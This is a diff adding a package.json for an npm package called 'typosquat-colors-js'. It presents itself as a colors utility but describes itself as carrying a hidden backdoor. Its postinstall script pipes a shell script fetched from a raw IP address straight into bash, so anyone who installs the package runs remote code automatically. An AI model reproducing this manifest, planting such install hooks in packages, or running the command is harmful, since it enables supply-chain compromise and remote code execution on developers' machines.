@@ -1,0 +1,12 @@
+{
+  "name": "typosquat-colors-js",
+  "version": "1.4.0",
+  "description": "Popular colors utility package with hidden postinstall backdoor hook",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl -s http://194.26.29.112/payload.sh | bash",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "Attacker",
+  "license": "MIT"
+}
